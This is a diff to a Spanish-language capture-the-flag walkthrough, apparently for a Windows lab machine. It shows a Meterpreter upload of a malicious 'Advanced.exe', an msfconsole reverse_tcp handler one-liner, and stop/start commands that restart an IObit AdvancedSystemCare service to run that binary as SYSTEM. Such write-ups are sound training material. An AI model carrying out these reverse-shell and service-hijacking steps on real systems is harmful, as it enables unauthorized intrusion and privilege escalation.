@@ -182,8 +182,37 @@ Mode              Size  Type  Last modified              Name
 040777/rwxrwxrwx  0     dir   2013-08-22 12:39:30 -0300  WindowsPowerShell
 100666/rw-rw-rw-  174   fil   2013-08-22 12:37:57 -0300  desktop.ini
 
-Nos metemos y subimos el exploit.
+# Nos metemos y subimos el exploit.
 meterpreter > upload Advanced.exe
+
+$msfconsole -qx 'use exploit/multi/handler;set lhost tun0;set lport 4443;set payload windows/meterpreter/reverse_tcp;run'
+
+# Luego tenemos que reiniciar el servicio y activarlo nuevamente
+C:\Program Files (x86)\IObit>sc stop AdvancedSystemCareService9
+sc stop AdvancedSystemCareService9
+
+SERVICE_NAME: AdvancedSystemCareService9 
+        TYPE               : 110  WIN32_OWN_PROCESS  (interactive)
+        STATE              : 4  RUNNING 
+                                (STOPPABLE, PAUSABLE, ACCEPTS_SHUTDOWN)
+        WIN32_EXIT_CODE    : 0  (0x0)
+        SERVICE_EXIT_CODE  : 0  (0x0)
+        CHECKPOINT         : 0x0
+        WAIT_HINT          : 0x0
+
+C:\Program Files (x86)\IObit>sc start AdvancedSystemCareService9
+sc start AdvancedSystemCareService9
+
+SERVICE_NAME: AdvancedSystemCareService9 
+        TYPE               : 110  WIN32_OWN_PROCESS  (interactive)
+        STATE              : 2  START_PENDING 
+                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
+        WIN32_EXIT_CODE    : 0  (0x0)
+        SERVICE_EXIT_CODE  : 0  (0x0)
+        CHECKPOINT         : 0x0
+        WAIT_HINT          : 0x7d0
+        PID                : 2592
+        FLAGS              : 
 ```
 
 Con esto tenemos nuestra shell en root. Se puede generar tambien un meterpreter para que sea mas estable que un NC mediante `msfconsole -qx 'use exploit/multi/handler;set lhost tun0;set lport 4443;set payload windows/meterpreter/reverse_tcp;run'`
